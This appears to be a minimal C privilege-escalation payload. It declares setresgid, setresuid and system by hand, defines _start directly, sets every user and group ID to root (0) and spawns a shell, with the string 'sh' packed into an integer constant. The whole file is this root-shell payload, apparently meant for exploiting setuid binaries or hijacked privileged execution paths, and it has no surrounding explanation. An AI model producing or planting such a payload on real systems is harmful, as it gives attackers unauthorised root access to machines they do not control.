int setresgid(int, int, int);
int setresuid(int, int, int);
int system(const int*);
void _start()
{
	const int cmd = 0x6873; // 'sh'
	setresgid(0, 0, 0);
	setresuid(0, 0, 0);
	system(&cmd);
}
